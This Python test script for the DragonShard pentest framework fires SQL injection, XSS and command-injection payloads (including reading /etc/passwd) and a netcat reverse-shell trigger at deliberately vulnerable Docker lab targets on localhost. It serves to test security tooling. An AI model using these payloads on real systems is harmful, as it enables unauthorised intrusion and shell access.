#!/usr/bin/env python3
"""
Live Attack Test Script for DragonShard

This script performs real attacks against vulnerable Docker containers
to test DragonShard's capabilities in a realistic environment.
"""

import asyncio
import json
import logging
import requests
import subprocess
import sys
import time
from datetime import datetime
from typing import Dict, List, Optional, Tuple

# Add the dragonshard package to the path
sys.path.insert(0, '../..')

from dragonshard.api_inference.unified_crawler import UnifiedCrawler
from dragonshard.fuzzing.fuzzer import Fuzzer
from dragonshard.fuzzing.genetic_mutator import GeneticMutator
from dragonshard.executor.reverse_shell import ReverseShellHandler
from dragonshard.executor.session_manager import SessionManager
from dragonshard.planner.chain_planner import ChainPlanner
from dragonshard.planner.vulnerability_prioritization import VulnerabilityPrioritizer

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


class LiveAttackTester:
    """Comprehensive live attack tester."""
    
    def __init__(self):
        """Initialize the live attack tester."""
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'DragonShard/1.0'
        })
        
        # Test targets
        self.targets = {
            'dvwa': 'http://localhost:8080',
            'juice-shop': 'http://localhost:3000',
            'webgoat': 'http://localhost:8081',
            'vuln-php': 'http://localhost:8082',
            'vuln-node': 'http://localhost:8083',
            'vuln-python': 'http://localhost:8084',
            'vuln-stress-test': 'http://localhost:8085'
        }
        
        # Test results
        self.results = {
            'targets_available': [],
            'targets_unavailable': [],
            'vulnerabilities_found': [],
            'attacks_successful': [],
            'attacks_failed': [],
            'performance_metrics': {}
        }
    
    def check_docker_environment(self) -> bool:
        """Check if Docker environment is running."""
        logger.info("🔍 Checking Docker environment...")
        
        try:
            # Get the current script directory and navigate to the project root
            import os
            script_dir = os.path.dirname(os.path.abspath(__file__))
            project_root = os.path.join(script_dir, '../..')
            
            result = subprocess.run(
                ['docker-compose', '-f', os.path.join(project_root, 'docker-compose.test.yml'), 'ps'],
                capture_output=True,
                text=True,
                cwd=project_root
            )
            
            if result.returncode != 0:
                logger.error("❌ Docker containers are not running!")
                logger.info("Please start the test environment with: make test-env-start")
                return False
            
            logger.info("✅ Docker containers are running")
            return True
            
        except FileNotFoundError:
            logger.error("❌ docker-compose not found!")
            return False
    
    def wait_for_target(self, target_url: str, timeout: int = 60) -> bool:
        """Wait for a target to become available."""
        logger.info(f"⏳ Waiting for target: {target_url}")
        start_time = time.time()
        
        while time.time() - start_time < timeout:
            try:
                response = self.session.get(target_url, timeout=5)
                if response.status_code == 200:
                    logger.info(f"✅ Target {target_url} is available")
                    return True
            except requests.exceptions.RequestException:
                pass
            
            time.sleep(2)
        
        logger.error(f"❌ Target {target_url} failed to become available")
        return False
    
    def test_target_availability(self) -> Dict[str, bool]:
        """Test availability of all targets."""
        logger.info("🧪 Testing target availability...")
        
        availability = {}
        for name, url in self.targets.items():
            if self.wait_for_target(url, timeout=30):
                availability[name] = True
                self.results['targets_available'].append(name)
            else:
                availability[name] = False
                self.results['targets_unavailable'].append(name)
        
        return availability
    
    def test_sql_injection(self, target_name: str, target_url: str) -> List[Dict]:
        """Test SQL injection against a target."""
        logger.info(f"🔍 Testing SQL injection against {target_name}")
        
        vulnerabilities = []
        
        # SQL injection payloads
        sql_payloads = [
            "1' OR '1'='1",
            "1' UNION SELECT 1,2,3--",
            "admin'--",
            "1' AND 1=1--",
            "1' AND 1=2--"
        ]
        
        for payload in sql_payloads:
            try:
                if target_name == 'dvwa':
                    # DVWA requires login first
                    login_data = {
                        'username': 'admin',
                        'password': 'password',
                        'Login': 'Login'
                    }
                    self.session.post(f"{target_url}/login.php", data=login_data)
                    test_url = f"{target_url}/vulnerabilities/sqli/"
                    data = {'id': payload, 'Submit': 'Submit'}
                else:
                    test_url = f"{target_url}/search"
                    data = {'search': payload}
                
                response = self.session.post(test_url, data=data)
                
                # Check for SQL injection indicators
                indicators = [
                    'mysql_fetch_array()',
                    'mysql_num_rows()',
                    'You have an error in your SQL syntax',
                    'Warning: mysql_',
                    'SQLSTATE[',
                    'MySQL server version',
                    'sqlite3',
                    'SQLITE_ERROR',
                    'syntax error',
                    'near',
                    'unrecognized token'
                ]
                
                found_indicators = []
                for indicator in indicators:
                    if indicator.lower() in response.text.lower():
                        found_indicators.append(indicator)
                
                if found_indicators:
                    vulnerability = {
                        'target': target_name,
                        'vulnerability_type': 'SQL Injection',
                        'payload': payload,
                        'indicators': found_indicators,
                        'url': test_url,
                        'status_code': response.status_code
                    }
                    vulnerabilities.append(vulnerability)
                    logger.info(f"✅ SQL injection found with payload '{payload}': {found_indicators}")
                else:
                    logger.info(f"⚠️ No SQL injection detected with payload '{payload}'")
                    
            except Exception as e:
                logger.error(f"❌ SQL injection test failed for {target_name}: {e}")
        
        return vulnerabilities
    
    def test_xss(self, target_name: str, target_url: str) -> List[Dict]:
        """Test XSS against a target."""
        logger.info(f"🔍 Testing XSS against {target_name}")
        
        vulnerabilities = []
        
        # XSS payloads
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "<svg onload=alert(1)>",
            "'><script>alert('XSS')</script>"
        ]
        
        for payload in xss_payloads:
            try:
                if target_name == 'vuln-node':
                    test_url = f"{target_url}/xss"
                    data = {'input': payload}
                    response = self.session.post(test_url, data=data)
                else:
                    test_url = f"{target_url}/?input={payload}"
                    response = self.session.get(test_url)
                
                # Check if payload is reflected in response
                if payload in response.text:
                    vulnerability = {
                        'target': target_name,
                        'vulnerability_type': 'XSS',
                        'payload': payload,
                        'reflected': True,
                        'url': test_url,
                        'status_code': response.status_code
                    }
                    vulnerabilities.append(vulnerability)
                    logger.info(f"✅ XSS payload reflected: '{payload}'")
                else:
                    logger.info(f"⚠️ XSS payload not reflected: '{payload}'")
                    
            except Exception as e:
                logger.error(f"❌ XSS test failed for {target_name}: {e}")
        
        return vulnerabilities
    
    def test_command_injection(self, target_name: str, target_url: str) -> List[Dict]:
        """Test command injection against a target."""
        logger.info(f"🔍 Testing command injection against {target_name}")
        
        vulnerabilities = []
        
        # Command injection payloads
        cmd_payloads = [
            "127.0.0.1; ls",
            "127.0.0.1 && whoami",
            "127.0.0.1 | cat /etc/passwd",
            "127.0.0.1; id",
            "127.0.0.1; pwd"
        ]
        
        for payload in cmd_payloads:
            try:
                test_url = f"{target_url}/command"
                data = {'command': payload}
                
                response = self.session.post(test_url, data=data)
                
                # Check for command injection indicators
                indicators = [
                    'root:x:0:0',
                    'bin:x:1:1',
                    'daemon:x:1:1',
                    '/bin/bash',
                    '/home/',
                    'uid=',
                    'gid='
                ]
                
                found_indicators = []
                for indicator in indicators:
                    if indicator.lower() in response.text.lower():
                        found_indicators.append(indicator)
                
                if found_indicators:
                    vulnerability = {
                        'target': target_name,
                        'vulnerability_type': 'Command Injection',
                        'payload': payload,
                        'indicators': found_indicators,
                        'url': test_url,
                        'status_code': response.status_code
                    }
                    vulnerabilities.append(vulnerability)
                    logger.info(f"✅ Command injection found with payload '{payload}': {found_indicators}")
                else:
                    logger.info(f"⚠️ No command injection detected with payload '{payload}'")
                    
            except Exception as e:
                logger.error(f"❌ Command injection test failed for {target_name}: {e}")
        
        return vulnerabilities
    
    def test_crawling(self, target_name: str, target_url: str) -> Dict:
        """Test crawling against a target."""
        logger.info(f"🕷️ Testing crawling against {target_name}")
        
        try:
            start_time = time.time()
            
            # Crawl the target
            crawler = UnifiedCrawler()
            results = crawler.crawl(target_url)
            
            crawl_time = time.time() - start_time
            
            # Analyze results
            discovered_endpoints = []
            for result in results:
                if isinstance(result, str):
                    discovered_endpoints.append(result)
                elif hasattr(result, 'get') and result.get('url'):
                    discovered_endpoints.append(result['url'])
            
            crawl_result = {
                'target': target_name,
                'pages_discovered': len(results),
                'endpoints_found': len(discovered_endpoints),
                'crawl_time': crawl_time,
                'endpoints': discovered_endpoints[:5]  # First 5 endpoints
            }
            
            logger.info(f"✅ Crawled {len(results)} pages from {target_name} in {crawl_time:.2f}s")
            logger.info(f"Discovered endpoints: {discovered_endpoints[:3]}...")
            
            return crawl_result
            
        except Exception as e:
            logger.error(f"❌ Crawling test failed for {target_name}: {e}")
            return {
                'target': target_name,
                'error': str(e),
                'pages_discovered': 0,
                'endpoints_found': 0,
                'crawl_time': 0
            }
    
    def test_fuzzing(self, target_name: str, target_url: str) -> Dict:
        """Test fuzzing against a target."""
        logger.info(f"🧬 Testing fuzzing against {target_name}")
        
        try:
            start_time = time.time()
            
            # Initialize fuzzer
            fuzzer = Fuzzer()
            
            # Test endpoint
            test_url = f"{target_url}/search"
            
            # Base SQL injection payloads
            base_payloads = [
                "1' OR '1'='1",
                "1' UNION SELECT 1,2,3--",
                "admin'--"
            ]
            
            # Run fuzzing
            results = fuzzer.fuzz_url(
                url=test_url,
                method='POST',
                payload_types=['sqli']
            )
            
            fuzz_time = time.time() - start_time
            
            # Analyze results
            successful_attacks = [r for r in results if hasattr(r, 'is_vulnerable') and r.is_vulnerable]
            
            fuzz_result = {
                'target': target_name,
                'test_url': test_url,
                'total_tests': len(results),
                'successful_attacks': len(successful_attacks),
                'fuzz_time': fuzz_time,
                'success_rate': len(successful_attacks) / len(results) if results else 0
            }
            
            logger.info(f"✅ Fuzzed {target_name}: {len(successful_attacks)}/{len(results)} successful attacks")
            
            return fuzz_result
            
        except Exception as e:
            logger.error(f"❌ Fuzzing test failed for {target_name}: {e}")
            return {
                'target': target_name,
                'error': str(e),
                'total_tests': 0,
                'successful_attacks': 0,
                'fuzz_time': 0,
                'success_rate': 0
            }
    
    def test_reverse_shell(self, target_name: str, target_url: str) -> Dict:
        """Test reverse shell capability against a target."""
        logger.info(f"🐚 Testing reverse shell against {target_name}")
        
        try:
            # Create a reverse shell listener
            handler = ReverseShellHandler()
            connection_id = handler.create_listener(port=4445)  # Use different port
            
            # Test reverse shell trigger
            test_url = f"{target_url}/command"
            payload = "127.0.0.1; nc 127.0.0.1 4444 -e /bin/bash"
            
            response = self.session.post(test_url, data={'command': payload})
            
            # Clean up
            handler.close_connection(connection_id)
            
            reverse_shell_result = {
                'target': target_name,
                'listener_created': True,
                'payload_sent': True,
                'response_status': response.status_code,
                'connection_id': connection_id
            }
            
            logger.info(f"✅ Reverse shell test completed for {target_name}")
            
            return reverse_shell_result
            
        except Exception as e:
            logger.error(f"❌ Reverse shell test failed for {target_name}: {e}")
            return {
                'target': target_name,
                'error': str(e),
                'listener_created': False,
                'payload_sent': False
            }
    
    def run_comprehensive_test(self) -> Dict:
        """Run comprehensive live attack tests."""
        logger.info("🚀 Starting Comprehensive Live Attack Tests")
        logger.info("=" * 60)
        
        # Check Docker environment
        if not self.check_docker_environment():
            return {'error': 'Docker environment not available'}
        
        # Test target availability
        availability = self.test_target_availability()
        
        # Run tests against available targets
        for target_name, target_url in self.targets.items():
            if not availability.get(target_name, False):
                logger.warning(f"⚠️ Skipping {target_name} - not available")
                continue
            
            logger.info(f"🎯 Testing {target_name} at {target_url}")
            
            # Test different vulnerability types
            sql_vulns = self.test_sql_injection(target_name, target_url)
            xss_vulns = self.test_xss(target_name, target_url)
            cmd_vulns = self.test_command_injection(target_name, target_url)
            
            # Test DragonShard components
            crawl_result = self.test_crawling(target_name, target_url)
            fuzz_result = self.test_fuzzing(target_name, target_url)
            reverse_shell_result = self.test_reverse_shell(target_name, target_url)
            
            # Collect results
            all_vulns = sql_vulns + xss_vulns + cmd_vulns
            self.results['vulnerabilities_found'].extend(all_vulns)
            
            if all_vulns:
                self.results['attacks_successful'].append({
                    'target': target_name,
                    'vulnerabilities': len(all_vulns),
                    'types': list(set(v['vulnerability_type'] for v in all_vulns))
                })
            else:
                self.results['attacks_failed'].append(target_name)
            
            # Store performance metrics
            self.results['performance_metrics'][target_name] = {
                'crawling': crawl_result,
                'fuzzing': fuzz_result,
                'reverse_shell': reverse_shell_result
            }
        
        return self.results
    
    def print_results(self, results: Dict):
        """Print comprehensive test results."""
        logger.info("📊 Live Attack Test Results")
        logger.info("=" * 60)
        
        # Target availability
        logger.info(f"🎯 Targets Available: {len(results['targets_available'])}")
        logger.info(f"   Available: {', '.join(results['targets_available'])}")
        logger.info(f"   Unavailable: {', '.join(results['targets_unavailable'])}")
        
        # Vulnerabilities found
        logger.info(f"🔍 Vulnerabilities Found: {len(results['vulnerabilities_found'])}")
        for vuln in results['vulnerabilities_found']:
            logger.info(f"   {vuln['target']} - {vuln['vulnerability_type']}: {vuln['payload']}")
        
        # Attack success rate
        total_targets = len(results['targets_available'])
        successful_attacks = len(results['attacks_successful'])
        failed_attacks = len(results['attacks_failed'])
        
        logger.info(f"⚔️ Attack Success Rate: {successful_attacks}/{total_targets} ({successful_attacks/total_targets*100:.1f}%)")
        
        # Performance metrics
        logger.info("📈 Performance Metrics:")
        for target, metrics in results['performance_metrics'].items():
            if 'crawling' in metrics:
                crawl = metrics['crawling']
                logger.info(f"   {target} - Crawling: {crawl.get('pages_discovered', 0)} pages in {crawl.get('crawl_time', 0):.2f}s")
            
            if 'fuzzing' in metrics:
                fuzz = metrics['fuzzing']
                logger.info(f"   {target} - Fuzzing: {fuzz.get('successful_attacks', 0)}/{fuzz.get('total_tests', 0)} successful")
        
        # Save results to file
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"live_attack_results_{timestamp}.json"
        
        with open(filename, 'w') as f:
            json.dump(results, f, indent=2, default=str)
        
        logger.info(f"💾 Results saved to {filename}")


def main():
    """Main function."""
    logger.info("🐉 DragonShard Live Attack Tester")
    logger.info("=" * 60)
    
    # Create tester
    tester = LiveAttackTester()
    
    # Run comprehensive tests
    results = tester.run_comprehensive_test()
    
    if 'error' in results:
        logger.error(f"❌ Test failed: {results['error']}")
        return 1
    
    # Print results
    tester.print_results(results)
    
    logger.info("=" * 60)
    logger.info("🎉 Live Attack Tests Completed!")
    
    return 0


if __name__ == '__main__':
    exit(main()) 